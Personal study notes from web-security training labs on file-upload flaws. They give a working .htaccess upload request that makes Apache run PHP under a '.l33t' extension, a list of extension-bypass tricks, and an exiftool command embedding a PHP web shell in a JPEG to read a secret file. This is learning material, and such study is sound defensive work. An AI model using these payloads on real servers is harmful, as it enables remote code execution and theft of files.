- we `php5 , shmtl , and so on`
- as the server we are targeting here is apache and we noticed that from the  response to our upload request : 
	- ![[Pasted image 20231129095938.png]]
	- so we will try to trick the apache server and make it think that we are uploading a configuration plan texted file while in reality it will be our PHP script which is being uploaded 
	- first we will convert the  extension of our file to (.htaccess)
	- second we will convert the content-type:  to  text/plain 
	- we will add apache directive(order) : we will till  the apache to treat the  .l33t files as a php file so we will say 
		- (`AddType application/x-httpd-php .l33t`) 
	```http
Content-Disposition: form-data; name="avatar"; filename=".htaccess"
Content-Type: text/plain

AddType application/x-httpd-php .l33t
```


okay so what i did was   2 steps 
1. upload a  configuration file for the apache 
2. upload our php file but with the .l33t extension instead 
what will happen here is we are going to tell the  apache server to run the php script if it found its  extension .l33t 
so 

1. we made the config as in the same request we are using to upload so  
		a. in the place of the content of our php file we will put 
		`AddType application/x-httpd-php .l33t` 
		b. we will also change the value in the place of filename=  `filename=".htaccess"` 
		c. we will convert the content type to  `text/plain`
		
1. ![[Pasted image 20231129121507.png]]
	 - we uploaded our php file as a name.l33t 





---
# from our new things that we learned : 

```
.php.jpg
.php.
.phpph
.php;jpg
.asp;jpg
.asp%00jpg
Try using multibyte unicode characters, which may be converted to null bytes and dots after unicode conversion or normalization. Sequences like `xC0 x2E`, `xC4 xAE` or `xC0 xAE` may be translated to `x2E` if the filename parsed as a UTF-8 string, but then converted to ASCII characters before being used in a path.
.p.phphp -> simillar to sc*script*ipt

```


# Flawed validation of the file's contents  : 

`Content-Type` ->  will be compared with the first few lines of the code of the file we are trying to upload to the server so we are going to need to check for things like that and put them in our considieration  so after we notice something like that the file we are trying to upload is getting refused we can think of the possblility of its content-type being  compared to the  
	so there is a specific sequence of  bytes that we refer to them via the  FF D8 FF so if we are going to use the JPEG we will need them to be at the first  couple of lines . 

### The lab : Remote code exectution via polyglot web shell upload :

## we can convert a script to be like a photo and bypass the content check using (exiftool)


`exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php`

`exiftool -Comment=""   photo.jpg -o output.php`
- we can note that  they concatenated the output of the script of php with a start at the start and end at the end  




------
# we are going to talk about how to exploit file upload race conditions : 


# This is ranked as an expert Lab and they  did use the  turbo intruder extension which is an extension in the  burp pro version .


## and now i will see the Laps of race condition . 
